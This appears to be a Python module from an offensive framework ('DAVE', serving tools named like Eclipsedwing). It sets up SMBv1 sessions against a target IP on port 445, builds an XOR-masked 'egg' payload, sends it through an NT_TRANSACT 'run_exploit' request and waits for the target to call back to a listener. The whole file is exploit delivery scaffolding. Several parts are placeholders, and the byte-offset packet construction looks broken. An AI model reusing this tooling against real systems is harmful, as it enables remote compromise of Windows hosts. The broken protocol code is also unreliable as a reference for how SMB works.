# -*- coding: utf-8 -*-
"""
dave.protocol — DAVE 统一会话层。

基于 adfw/tibe/trfo/trch/posh/coli/tucl 构建的高层会话对象，供 Eclipsedwing
等 DAVE 框架工具复用。提供 SMBv1 协商/会话/树连接、DCE-RPC 绑定/请求、
NTLM/SNEGO/Netlogon 验证构造等原语。
"""

import socket
import struct
from . import posh
from . import trfo
from . import adfw
from . import tibe
from . import trch
from . import tucl


class DaveSession:
    """DAVE 会话：封装目标连接、SMB/DCE-RPC 状态与参数集。"""

    def __init__(self, target_ip, target_port=445, protocol="SMB",
                 network_timeout=30.0, callback_ip=None, callback_port=0,
                 xor_mask=0):
        self.ctx = adfw.adfw_create("dave-session")
        self.ctx.set_process("dave.protocol")
        self.ctx.initialize()

        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol
        self.network_timeout = network_timeout
        self.callback_ip = callback_ip
        self.callback_port = callback_port
        self.xor_mask = xor_mask

        self.params = trch.Config_create("dave-session")
        self.params.add_parameter(trch.Parameter("TargetIP", "String", target_ip))
        self.params.add_parameter(trch.Parameter("TargetPort", "U16", target_port))
        self.params.add_parameter(trch.Parameter("CallbackIP", "String", callback_ip or ""))
        self.params.add_parameter(trch.Parameter("CallbackPort", "U16", callback_port))
        self.params.add_parameter(trch.Parameter("XorMask", "U32", xor_mask))

        self.sock = None
        self.tid = 0
        self.uid = 0
        self.mid = 0
        self.session_key = b""
        self.encrypted = False

    def connect(self):
        """建立到目标的 TCP 连接（SMBv1 over TCP 445）。"""
        self.sock = socket.create_connection((self.target_ip, self.target_port),
                                             timeout=self.network_timeout)
        tucl.TcLog(1, "Connected to %s:%d" % (self.target_ip, self.target_port))
        return self.sock

    def close(self):
        if self.sock:
            tibe.TbCloseSocket(self.sock)
            self.sock = None

    def negotiate(self):
        """SMBv1 Negotiate。"""
        param, data = tibe.smb_negotiate_request()
        hdr = tibe.make_smb_header(tibe.SMB_COM_NEGOTIATE)
        param_len = posh.POSH_WriteU16ToLittle(bytearray(2), 0, len(param))
        data_len = posh.POSH_WriteU32ToLittle(bytearray(4), 0, len(data))
        total = hdr + bytes(param_len) + bytes(data_len) + param + data
        tibe.TbSend(self.sock, total)
        resp = tibe.TbRecvSmb(self.sock, 4096)
        tucl.TcLogBuffer(1, resp, "NEGOTIATE response:")
        self.mid = posh.POSH_ReadU16FromLittle(resp, 27)
        return resp

    def session_setup_andx(self, account="", password="", domain=""):
        """SMBv1 Session Setup AndX（占位：构造基础请求）。"""
        hdr = tibe.make_smb_header(tibe.SMB_COM_SESSION_SETUP_AND_X, mid=self.mid + 1)
        # WordCount(1) + AndXCommand(2) + AndXOffset(2) + MaxBuffer(2) +
        # MaxMpx(2) + MaxVcs(2) + SessionKey(4) + CaseInsensitivePasswordLen(2) +
        # CaseSensitivePasswordLen(2) + Reserved(4) + Capabilities(4) +
        # ByteCount(2) + Payload
        body = bytearray()
        body.append(0)  # WordCount placeholder
        posh.POSH_WriteU16ToLittle(body, 1, 0xFF)  # AndXCommand = 0xFF (none)
        posh.POSH_WriteU16ToLittle(body, 3, 0)  # AndXOffset
        posh.POSH_WriteU16ToLittle(body, 5, 4356)  # MaxBuffer
        posh.POSH_WriteU16ToLittle(body, 7, 1)  # MaxMpx
        posh.POSH_WriteU16ToLittle(body, 9, 1)  # MaxVcs
        posh.POSH_WriteU32ToLittle(body, 11, 0)  # SessionKey
        posh.POSH_WriteU16ToLittle(body, 15, len(password))  # CaseInsensitivePasswordLen
        posh.POSH_WriteU16ToLittle(body, 17, 0)  # CaseSensitivePasswordLen
        posh.POSH_WriteU32ToLittle(body, 19, 0)  # Reserved
        posh.POSH_WriteU32ToLittle(body, 23, 0x00000020)  # Capabilities: extended security
        # ByteCount + payload
        posh.POSH_WriteU16ToLittle(body, len(body), len(password) + len(domain) + len(account))
        body += password.encode("utf-16-le")
        body += domain.encode("utf-16-le")
        body += account.encode("utf-16-le")
        posh.POSH_WriteU16ToLittle(hdr, 24, len(body))  # ByteCount in header
        total = hdr + body
        tibe.TbSend(self.sock, total)
        resp = tibe.TbRecvSmb(self.sock, 4096)
        tucl.TcLogBuffer(1, resp, "SESSION_SETUP_ANDX response:")
        return resp

    def tree_connect_andx(self, share="\\\\*\\IPC$"):
        """SMBv1 Tree Connect AndX（占位）。"""
        hdr = tibe.make_smb_header(tibe.SMB_COM_TREE_CONNECT_AND_X, mid=self.mid + 2)
        body = bytearray()
        body.append(0)  # WordCount
        posh.POSH_WriteU16ToLittle(body, 1, 0xFF)  # AndXCommand = none
        posh.POSH_WriteU16ToLittle(body, 3, 0)  # AndXOffset
        posh.POSH_WriteU16ToLittle(body, 5, 4356)  # MaxBuffer
        posh.POSH_WriteU16ToLittle(body, 7, 1)  # MaxMpx
        posh.POSH_WriteU16ToLittle(body, 9, 1)  # MaxVcs
        posh.POSH_WriteU32ToLittle(body, 11, 0)  # SessionKey
        posh.POSH_WriteU16ToLittle(body, 15, 0)  # Flags
        posh.POSH_WriteU16ToLittle(body, len(body), len(share) + 1)
        body += share.encode("utf-16-le") + b"\x00\x00"
        posh.POSH_WriteU16ToLittle(hdr, 24, len(body))
        total = hdr + body
        tibe.TbSend(self.sock, total)
        resp = tibe.TbRecvSmb(self.sock, 4096)
        tucl.TcLogBuffer(1, resp, "TREE_CONNECT_ANDX response:")
        # TID is at offset 24 in response
        self.tid = posh.POSH_ReadU16FromLittle(resp, 24)
        return resp

    def build_egg(self, auth_code, payload):
        """构造 XOR 掩码的 EGG：auth_code(4) + payload。"""
        return trfo.TfXorw2Encoder(posh.POSH_WriteU32ToLittle(bytearray(4), 0, auth_code) + payload, self.xor_mask)

    def build_primer(self):
        """构造 primer 请求（SMB pipe \\browser）。占位。"""
        return b""

    def run_exploit(self, egg):
        """发送 exploit 请求（占位：基于 TbDoSmbNtTransact）。"""
        hdr = tibe.make_smb_header(tibe.SMB_COM_NT_TRANSACT, mid=self.mid + 3)
        body = bytearray()
        body.append(0)  # WordCount
        # 参数块：Setup(2) + TotalParameterCount(2) + TotalDataCount(4) +
        # MaxParameterCount(2) + MaxDataCount(4) + ParameterOffset(2) +
        # ParameterCount(2) + ParameterOffset(2) + DataOffset(2) + DataCount(2) +
        # ByteCount(2) + ...
        posh.POSH_WriteU16ToLittle(body, 1, 0)  # SetupCount
        posh.POSH_WriteU16ToLittle(body, 3, 0)  # TotalParameterCount
        posh.POSH_WriteU32ToLittle(body, 5, len(egg))  # TotalDataCount
        posh.POSH_WriteU16ToLittle(body, 9, 0)  # MaxParameterCount
        posh.POSH_WriteU32ToLittle(body, 11, len(egg))  # MaxDataCount
        posh.POSH_WriteU16ToLittle(body, 15, 0)  # ParameterOffset
        posh.POSH_WriteU16ToLittle(body, 17, 0)  # ParameterCount
        posh.POSH_WriteU16ToLittle(body, 19, 0)  # ParameterOffset (high)
        posh.POSH_WriteU16ToLittle(body, 21, len(egg))  # DataCount
        posh.POSH_WriteU16ToLittle(body, len(body), len(egg))  # ByteCount
        body += egg
        posh.POSH_WriteU16ToLittle(hdr, 24, len(body))
        total = hdr + body
        tibe.TbSend(self.sock, total)
        resp = tibe.TbRecvSmb(self.sock, 4096)
        tucl.TcLogBuffer(1, resp, "NT_TRANSACT response:")
        return resp

    def callback_listen(self, port, timeout=60):
        """监听目标回调。"""
        ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        ls.bind((self.callback_ip or "0.0.0.0", port))
        ls.listen(1)
        ls.settimeout(timeout)
        tucl.TcLog(1, "Waiting for callback on port %d ..." % port)
        conn, addr = ls.accept()
        tucl.TcLog(1, "Callback complete from %s" % (addr,))
        conn.close()
        ls.close()
        return True


def dave_session_create(target_ip, target_port=445, **kwargs):
    return DaveSession(target_ip, target_port, **kwargs)


def dave_session_delete(session):
    session.close()
    adfw.adfw_delete(session.ctx)


__all__ = ["DaveSession", "dave_session_create", "dave_session_delete"]
